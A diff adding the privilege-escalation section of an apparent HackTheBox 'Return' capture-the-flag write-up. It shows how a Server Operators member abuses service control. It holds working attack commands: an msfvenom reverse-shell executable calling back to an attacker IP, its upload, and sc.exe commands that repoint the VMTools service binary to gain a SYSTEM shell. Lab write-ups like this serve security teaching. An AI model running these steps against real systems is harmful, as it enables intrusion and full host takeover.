@@ -139,8 +139,58 @@ soft!!😂. Lets go ahead to escalate our privileges
 
 # Privilege Escalation
 
+Checking the list of users on the computer
 
+command:```net user svc-printer```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e74cc2e7-6e59-4dd8-ae56-0f32ba3801e8)
+
+Being a member of server operator group is not a vulnerability, but the member of this group has special privileges to make changes in the domain which could lead an attacker to escalate to system privilege.
+
+You can check out this  [blog](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/), it's well explained here.
+
+Lets list services running on this server using the ```services``` command
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/42230f3b-36fa-4587-98d8-5e91abff7390)
+
+We can see list of services are there. Then we noted the service name “VMTools” and service binary path for lateral usage.
+
+Lets generate an exe payload using msfvenom
+
+command:```msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.16.30 lport=4444 -f exe > bankai.exe```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/return]
+└─$ msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.16.30 lport=4444 -f exe > bankai.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+                                                                                                                      
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/return]
+└─$ ls -l bankai.exe      
+-rw-r--r-- 1 bl4ck4non bl4ck4non 7168 Oct 14 15:03 bankai.exe
+```
+Lets upload this to the target's machine
+
+command:```upload bankai.exe```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6ff7717-f152-4c5b-8ff8-1951d013b5fb)
+
+cool cool,
+
+When we start any service then it will execute the binary from its binary path so if we replace the service binary with netcat or reverse shell binary then it will give us a reverse shell as a system user because the service is starting as a system on the compromised host
+
+Now,
+
+commands
+```
+sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\bankai.exe"
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+Ensure you set up your netcat listener before starting the service again
 
 
 
